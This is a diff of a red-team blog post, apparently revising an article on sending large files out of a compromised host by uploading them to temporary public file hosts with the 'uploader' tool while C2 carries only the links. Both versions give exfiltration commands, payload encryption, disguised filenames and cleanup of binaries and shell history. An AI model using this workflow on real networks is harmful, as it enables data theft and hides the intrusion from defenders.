@@ -1,8 +1,8 @@
 ---
-title: "When C2 Can't Pull Large Files: Cloud Relay for Post-Exploitation Exfil"
+title: "Large File Transfer over C2: Separating the Data Channel with Cloud Uploads"
 date: 2026-07-16T23:16:00+08:00
 draft: false
-description: "C2 is a poor pipe for large files. Split heavy traffic onto temporary cloud hosts, and use Uploader for probe, routing, packing, and encrypted upload."
+description: "Move large-file traffic off the C2 control channel and use Uploader for backend probing, size preflight, packing, encryption, and failover."
 categories: ["security"]
 tags: ["red-team", "c2", "post-exploitation", "uploader", "file-transfer"]
 featuredImage: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
@@ -13,82 +13,71 @@ toc:
   auto: true
 ---
 
-You are inside the network. Privileges are solid. The dumps and config backups are sitting right there — and still hard to get out. That happens a lot in authorized pentests.
+C2 is designed for command control and lightweight interaction, not sustained large-file transfers. During authorized testing, bulk traffic can be moved to a temporary cloud upload service while C2 only sends commands and returns download links.
 
 <!--more-->
-
-The bottleneck is usually the channel, not discovery: C2 (Command and Control) was never meant to move large files.
 
 {{< admonition warning "Disclaimer" >}}
 For authorized penetration testing and research only. Do not use this against systems you do not have permission to test.
 {{< /admonition >}}
 
-## 1. Why not pull big files over C2
+## 1. Why separate the data channel
 
-C2 is for control, command delivery, and light interaction. Pulling tens or hundreds of MB over it is more than a wobbly session.
+Directly downloading large files over C2 creates four problems:
 
-**The session itself.** Large transfers saturate the channel, freeze interactive work, and shake the heartbeat until the session dies mid-download. With sleep/jitter, one big file can drag on forever; many C2 downloaders have weak resume, so a break means starting over.
+- **Bandwidth contention**: bulk transfers block command interaction and heartbeats.
+- **Reliability**: sleep, jitter, timeouts, and weak resume support increase retransmission cost.
+- **Path overhead**: encoding, chunking, pivots, SOCKS, and multiple hops add traffic, latency, and failure points.
+- **Infrastructure exposure**: sustained high-volume traffic converges on the C2 server and affects other sessions on a shared Team Server.
 
-**The path shape.** HTTP(S) encoding and chunking can inflate traffic well beyond the original size. Each hop through pivots, SOCKS, or internal jump hosts adds latency and failure modes. On a shared Team Server, one operator's bulk download hurts everyone else's responsiveness.
-
-**Field and engineering limits.** Some implants cap size, timeout, or concurrency. Directories get dragged file by file. Staging leaves temporary artifacts that AV and behavior monitors can see. Worst case: a long, heavy flow toward your own C2 infrastructure paints where the control plane lives. Using the control channel as a data pipe is bad OPSEC.
-
-Typical outcome: access is fine, the session is fine, and the evidence is incomplete — or the cost of getting it out already exceeds the value.
-
-## 2. Don't pull — make the target push
-
-A more stable pattern moves heavy traffic off C2:
+The separated flow is:
 
 1. Stage files or directories on the target
-2. Have the target upload to a reachable cloud or temporary file host
-3. Download from that host on the attack machine
-4. Keep C2 for a short command and the returned link
+2. Upload from the target to a temporary storage service reachable from the current network
+3. Return the download link over C2
+4. Download the file from a separate testing environment
 
-Heavy traffic goes target → public upload service; control traffic stays on C2. The session is less likely to die under load, and the C2 infra does not have to absorb the bulk transfer.
+Control traffic stays on C2; large-file traffic follows target → upload service.
 
-The practical ask is narrow: drop a small binary on the target (Win/Linux first; macOS builds exist), point it at files or a directory, and let it push. Few dependencies, no popups, output a script can parse; fail early on size or dead backends instead of after a half-finished upload.
+## 2. How Uploader handles the transfer
 
-## 3. From Transfer to Uploader
+[Uploader](https://github.com/simonlee-hello/uploader) implements the multi-backend approach introduced by [Mikubill/transfer](https://github.com/Mikubill/transfer). Its main functions are:
 
-The idea is not new. [Mikubill/transfer](https://github.com/Mikubill/transfer) already shipped a multi-backend CLI: drop a binary, pick a host, upload, get a link.
+- `backends`: list backends, size limits, status, and URLs.
+- `probe`: test reachability and latency from the current network.
+- Automatic mode: filter backends by payload size, probe and sort by latency, then fail over on errors.
+- Size preflight: reject a file or estimated directory size that exceeds a backend limit.
+- Directory handling: create a temporary Deflate ZIP by default and remove it after upload; `-r` uploads files individually.
+- Encryption: `-e -k` uses AES-256-CBC with a `UP01` header, random IV, and ciphertext.
+- Script-friendly output: `-q` writes only the successful link to stdout and errors to stderr.
 
-It has been largely unmaintained (last visible activity around 2023). Dead backends, API drift, and edge bugs fail in the field; the help text often does not show which hosts exist, their size limits, or whether the current network can reach them.
+Backend availability changes with both the service and the network. Treat `uploader probe` as the runtime source of truth.
 
-I forked and reworked the approach as [simonlee-hello/uploader](https://github.com/simonlee-hello/uploader) (MIT; Go primary, mostly stdlib, ~6MB static binary; smaller experimental Rust build). UI and errors are English-only and kept short.
-
-What it adds in practice:
-
-- **Backend selection**: `-b` (backend) pins a host, e.g. `-b lit`. Without `-b`, auto mode filters by file size, runs `probe`, tries hosts from lowest latency, and fails over on error. With `-b` alone the host is fixed; `-b lit -auto` prefers lit but may still fail over.
-- **Visibility**: `uploader backends` lists name, size limit, status, and URL; `uploader probe` checks reachability and latency on the current network. Status is `ok` / `flaky` / `down`; unstable hosts are skipped unless you pass `-force`.
-- **Size preflight**: compares payload size to host limits before upload. For directories it uses the sum of file sizes as an upper bound (final zip size may differ); oversize aborts early with alternate host hints.
-- **Directories**: default Deflate zip to disk, upload, then delete the temp archive. `-r` uploads each file without packing.
-- **Encryption**: AES-256-CBC (`UP01` header + random IV), e.g. `-e -k 'your-key'`. Encrypted uploads disguise the name with a normal extension (like `.bin`) instead of `.encrypt`, which some hosts reject.
-- **Quiet output**: `-q` prints only the download link on stdout for C2/scripts; errors stay on stderr. Avoid `-keep`, which waits for Enter and hangs headless runs.
-
-There are 11 built-in backends (`temp`, `lit`, `gof`, `wss`, `fic`, `gg`, …). `cat` and `bash` are flaky; `nil` (0x0.st) is down. The list is informative — always trust `probe` on site.
-
-## 4. Fitting C2 workflows
+## 3. Command examples
 
 {{< image src="/images/posts/c2-large-file-exfil-via-cloud-upload/uploader-demo.gif" caption="Uploader demo: backends / probe / upload / quiet mode / encrypt" >}}
-
-Most common command:
 
 ```bash
 uploader -q ./evidence
 ```
 
-Without `-b` (no pinned backend): size filter → probe → latency order → failover. Directories are packed first. On success, stdout is usually a single link. Exit codes: `0` success, `1` upload/config error, `2` bad flags.
-
-Pin a backend, or prefer one but still allow failover:
+Without `-b`, the sequence is: size filter → probe → latency order → failover. Directories are packed first; success prints one download link.
 
 ```bash
+# Pin lit
 uploader -q -b lit ./dump.zip
+
+# Prefer lit but allow failover
 uploader -q -b lit -auto ./dump.zip
+
+# Upload directory files individually
 uploader -q -r ./dir
+
+# Encrypt before upload
 uploader -q -e -k 'your-key' ./secret.bin
 ```
 
-Probe only:
+List and probe backends:
 
 ```bash
 uploader backends
@@ -96,22 +85,13 @@ uploader probe
 uploader probe temp lit gof -timeout 20
 ```
 
-Hosts also differ in capacity and TTL (litterbox is about 72 hours). Pull the link from your own environment promptly.
+Exit codes are `0` for success, `1` for upload or configuration failure, and `2` for invalid arguments. `-keep` waits for keyboard input and is unsuitable for headless execution.
 
-## 5. Field checklist
+## 4. Limitations and checks
 
-1. Confirm egress: internet, proxy, allowlists, TLS inspection
-2. Validate with a small file, then move the real package
-3. Encrypt sensitive payloads with `-e -k`; keep filenames non-descriptive
-4. Clean temp zips, the binary, and shell history; download cloud links before they expire
-
-C2 for control, uploader for bulk exfil — do not make one channel do both heavy jobs.
-
-## 6. Wrap-up
-
-Post-exploitation often stalls not on privilege, but on moving large files without killing the session. Wrong channel choice means you can get in and still cannot get the data out.
-
-Having the target push to a cloud host, then pulling from that host, keeps bulk load off the control plane.
-
-- Project: [simonlee-hello/uploader](https://github.com/simonlee-hello/uploader)
-- Inspired by: [Mikubill/transfer](https://github.com/Mikubill/transfer)
+1. Confirm target egress, proxy, allowlists, and TLS inspection policy, then validate the path with a small file.
+2. Public upload services may log sources, scan content, and enforce file-type, capacity, and retention limits. Confirm engagement requirements before use.
+3. Directory mode writes a temporary ZIP to disk. Use `-r` or another transfer method if staging is not allowed.
+4. AES-256-CBC provides content confidentiality only; it does not replace integrity verification or key management.
+5. Filenames can disclose context. Use names without business meaning.
+6. After download, remove temporary files, the binary, and command history, and retrieve data before the link expires.
